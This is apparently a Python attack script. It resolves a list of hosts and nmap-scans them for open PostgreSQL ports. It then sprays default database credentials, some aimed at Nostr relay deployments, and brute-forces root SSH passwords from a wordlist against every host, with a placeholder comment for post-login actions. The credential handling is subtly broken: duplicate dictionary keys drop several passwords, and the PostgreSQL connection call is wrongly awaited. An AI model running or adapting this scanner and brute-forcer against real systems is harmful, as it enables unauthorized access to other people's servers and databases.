import asyncio
import socket
import nmap
import psycopg2
import paramiko
import os

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'

def read_hostnames_file():
    # Open the file for reading
    with open('hostnames.txt', 'r') as f:
        # Read all lines from the file into a list
        hostnames = f.readlines()
    
    # Strip newline characters from each line in the list
    hostnames = [hostname.strip() for hostname in hostnames]
    
    # Return the list of hostnames
    return hostnames

hostnames = read_hostnames_file()

credentials = {
    'postgres': 'postgres',
    'nostr': 'nostr',
    'nostr_ts_relay': 'nostr_ts_relay',
    'postgres': 'password',
    'postgres': 'admin',
    'admin': 'admin',
    'admin': 'password'
}


import json

HOSTS_FILE = 'hosts.json'

# Check if the file is empty
if not os.path.exists(HOSTS_FILE) or os.stat(HOSTS_FILE).st_size == 0:
    with open(HOSTS_FILE, 'w') as f:
        json.dump({}, f)


async def resolve_hosts(hosts):
    with open(HOSTS_FILE) as f:
        hosts_data = json.load(f)
    results = {}
    for host in hosts:
        if host in hosts_data:
            results[host] = hosts_data[host]
        else:
            try:
                ip = await asyncio.get_event_loop().getaddrinfo(host, None)
                results[host] = ip[0][4][0]
            except socket.error as err:
                print(f"Error resolving {host}: {err}")
    with open(HOSTS_FILE, 'w') as f:
        hosts_data.update(results)
        json.dump(hosts_data, f)
    return results

async def scan_host(host, hostname, scanner):
    try:
        with open(HOSTS_FILE) as f:
            hosts_data = json.load(f)
        if host in hosts_data and hosts_data[host] == hostname:
            print(f"Skipping host {hostname} ({host}): already scanned.")
            return None

        print(f"Scanning host {hostname} ({host})...")
        scanner.scan(host, arguments='-p 5432')
        results = scanner[host]['tcp']
        status = results[5432]['state']
        print(status)

        if status == 'open':
            print(f"{GREEN}Port 5432 is open on host {RESET}{hostname} ({host})!")
            return hostname

        with open(HOSTS_FILE, 'w') as f:
            hosts_data[host] = hostname
            json.dump(hosts_data, f)

    except KeyError:
        print(f"Error: Unable to retrieve results for host {host}. Skipping...")
    except Exception as e:
        print(f"Error occurred while scanning host {host}: {str(e)}")
    return None




async def connect_to_postgres(hosts, credentials):
    for host in hosts:
        for username, password in credentials.items():
            try:
                conn = await psycopg2.connect(
                    host=host,
                    user=username,
                    password=password
                )
                print(f"{GREEN}Successfully connected to PostgreSQL on {RESET}{host} {GREEN}using credentials: {RESET}{username}:{password}")
                conn.close()
                break  # Stop trying credentials if one works
            except Exception as e:
                print(f"{RED}Could not connect to PostgreSQL on {RESET}{host} {RED}with credentials: {RESET}{username}:{password}: {e}")


async def ssh_login(ip_dict, password_file):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.read().splitlines()

    for host, ip in ip_dict.items():
        print(f"Attempting SSH login on {ip}...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for pw in passwords:
            try:
                print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: client.connect(str(ip), username='root', password=pw, timeout=15),
                )
                print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
                # Add your desired actions here after successful login
                client.close()
                break
            except paramiko.AuthenticationException:
                # Incorrect password, continue to the next one
                continue
            except paramiko.SSHException:
                print(f"{RED}Failed to connect to{RESET} {ip}")
                break
            except socket.timeout:
                print(f"{RED}Connection timed out for {RESET}{ip}")
                break
            except paramiko.ssh_exception.NoValidConnectionsError as e:
                print(f"{RED}Unable to connect to port 22 on {RESET}{ip}")
                print(f"{RED}Error: {RESET}{str(e)}")
                break





async def main():
    # Resolve hosts asynchronously
    host_dict = await resolve_hosts(hostnames)
    print(host_dict)
#
    ## Define the list of hosts to scan
    #hosts = list(host_dict.values())

    # Create a new Nmap scanner object
    scanner = nmap.PortScanner()

    #Scan hosts and collect open ports
    postgres_open = await asyncio.gather(
        *[scan_host(host, hostname, scanner) for hostname, host in host_dict.items()]
    )
    postgres_open = [host for host in postgres_open if host is not None]

    # Connect to PostgreSQL using collected open hosts and credentials
    await connect_to_postgres(postgres_open, credentials)

    # Perform SSH login on the resolved hosts
    await ssh_login(host_dict, 'common_root_passwords.txt')

# Run the main function
asyncio.run(main())
